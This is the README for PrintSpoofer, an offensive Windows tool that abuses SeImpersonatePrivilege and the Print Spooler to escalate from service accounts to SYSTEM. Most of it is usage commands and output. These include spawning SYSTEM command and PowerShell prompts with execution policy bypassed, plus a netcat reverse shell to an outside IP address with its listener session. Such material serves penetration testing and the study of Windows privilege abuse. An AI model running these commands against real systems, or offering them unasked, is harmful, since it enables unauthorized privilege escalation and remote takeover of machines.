# PrintSpoofer

From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.

:information_source: If you want to know how this works, please check out this detailed blog post: [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](http://127.0.0.1:4000/printspoofer-abusing-impersonate-privileges/).

<p align="center">
  <img src="demo.gif">
</p>

## Usage

You can check the help message using the `-h` option.

```txt
C:\TOOLS>PrintSpoofer.exe -h

PrintSpoofer v0.1 (by @itm4n)

  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()

Arguments:
  -c <CMD>    Custom command line to execute
  -i          Interact with the new process in the current console (default is non-interactive)
  -d          Spawn a new process on the currently active desktop
  -h          That's me :)

Examples:
  - Run PowerShell as SYSTEM in the current console
      PrintSpoofer.exe -i -c powershell.exe
  - Spawn a SYSTEM command prompt on the currently active desktop
      PrintSpoofer.exe -d -c cmd.exe
  - Get a SYSTEM reverse shell
      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
```

### Example 1: Spawn a SYSTEM command prompt in the current console

:information_source: This command requires an __interactive__ shell.

:warning: Don't run this command through WinRM or in a pseudo-shell (e.g.: `wmiexec.py`).

```txt
C:\TOOLS>PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

### Example 2: Get a SYSTEM reverse shell

:information_source: This command can be used to create a new process and immediately exit.

```txt
C:\TOOLS>PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Netcat listener:

```txt
C:\TOOLS>nc.exe -l -p 1337
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

### Example 3: Spawn a SYSTEM PowerShell prompt on the active desktop

:information_source: For testing purposes, you can spawn a SYSTEM shell on your desktop. :)

:warning: Don't run this command in a terminal session (RDP).

```txt
C:\TOOLS>PrintSpoofer.exe -d -c "powershell -ep bypass"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
